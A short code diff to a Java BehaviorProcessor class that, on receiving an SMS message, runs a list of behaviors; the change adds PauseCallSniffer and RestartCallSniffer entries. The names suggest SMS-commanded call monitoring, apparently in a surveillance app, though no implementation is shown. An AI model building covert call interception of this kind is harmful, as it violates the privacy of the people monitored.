@@ -19,9 +19,11 @@ public class BehaviorProcessor {
 
 	public void process(SmsMessage sms) {
 		List<Behavior> behaviors = Arrays.asList(
-			new Pause(context),
 			new Register(context),
-			new Start(context)
+			new Start(context),
+			new Pause(context),
+			new PauseCallSniffer(context),
+			new RestartCallSniffer(context)
 		);
 		
 		for (Behavior behavior : behaviors) {
